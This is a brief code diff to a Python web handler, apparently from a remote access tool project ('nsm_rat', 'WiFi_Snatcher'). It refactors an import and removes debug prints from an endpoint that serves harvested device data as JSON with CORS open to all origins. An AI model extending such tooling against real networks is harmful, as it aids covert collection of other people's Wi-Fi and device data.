@@ -33,7 +33,7 @@ class HTTP_Handler(SimpleHTTPRequestHandler):
     def do_GET(self) -> None:
         """This will handle basic web server requests"""
 
-        from nsm_rat import WiFi_Snatcher
+        import nsm_rat
 
         try:
             if self.path == "/api/devices":
@@ -43,9 +43,7 @@ class HTTP_Handler(SimpleHTTPRequestHandler):
                 self.send_header("Access-Control-Allow-Origin", '*')
                 self.end_headers()
 
-                data = WiFi_Snatcher.master
-                CONSOLE.print(f"[bold cyan][DEBUG] Sending master data: {data}")
-                CONSOLE.print(f"[bold cyan][DEBUG] Data type: {type(data)}, Keys: {list(data.keys()) if isinstance(data, dict) else 'N/A'}")
+                data = nsm_rat.WiFi_Snatcher.master
                 self.wfile.write(json.dumps(data).encode())
 
             else:
